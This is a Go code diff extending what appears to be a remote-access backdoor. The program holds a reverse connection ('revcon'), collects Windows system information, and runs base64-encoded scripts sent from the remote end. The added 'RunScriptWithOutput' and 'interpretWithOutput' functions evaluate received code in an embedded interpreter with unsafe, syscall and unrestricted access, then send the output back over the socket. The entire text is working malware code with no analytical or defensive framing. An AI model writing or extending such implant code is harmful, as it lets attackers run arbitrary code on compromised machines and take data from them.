@@ -47,6 +47,8 @@ func main() {
 		switch args[0] {
 		case "runscript":
 			RunScript(revcon)
+		case "runwithoutput":
+			RunScriptWithOutput(revcon)
 		case "sysinfo":
 			sysinfo, err := exec.Command("systeminfo").CombinedOutput()
 			if err != nil {
@@ -102,6 +104,20 @@ func RunScript(conn net.Conn) {
 	go interpret(scriptbytes)
 }
 
+//RunScriptWithOutput runs given kzs and returns output
+func RunScriptWithOutput(conn net.Conn) {
+	fmt.Println("entered RunScriptWithOutput")
+	script, err := bufio.NewReader(conn).ReadString('\n')
+	if err != nil {
+		log.Println(err)
+	}
+	scriptbytes, err := base64.RawStdEncoding.DecodeString(script)
+	if err != nil {
+		log.Println(err)
+	}
+	go interpretWithOutput(scriptbytes, conn)
+}
+
 func interpret(scriptbytes []byte) {
 	i := interp.New(interp.Options{})
 	i.Use(stdlib.Symbols)
@@ -112,4 +128,25 @@ func interpret(scriptbytes []byte) {
 	if err != nil {
 		log.Println(err)
 	}
+}
+
+func interpretWithOutput(scriptbytes []byte, revcon net.Conn) {
+	i := interp.New(interp.Options{})
+	i.Use(stdlib.Symbols)
+	i.Use(unsafe.Symbols)
+	i.Use(syscall.Symbols)
+	i.Use(unrestricted.Symbols)
+	
+	fmt.Println(string(scriptbytes))
+	i.Eval(string(scriptbytes))
+	v, err := i.Eval("runner.RunScript")
+	if err != nil {
+		revcon.Write([]byte(err.Error() + "\n"))
+		return
+	}
+	runscript := v.Interface().(func() string)
+
+	out := runscript()
+	fmt.Println(out)
+	revcon.Write([]byte(out))
 }
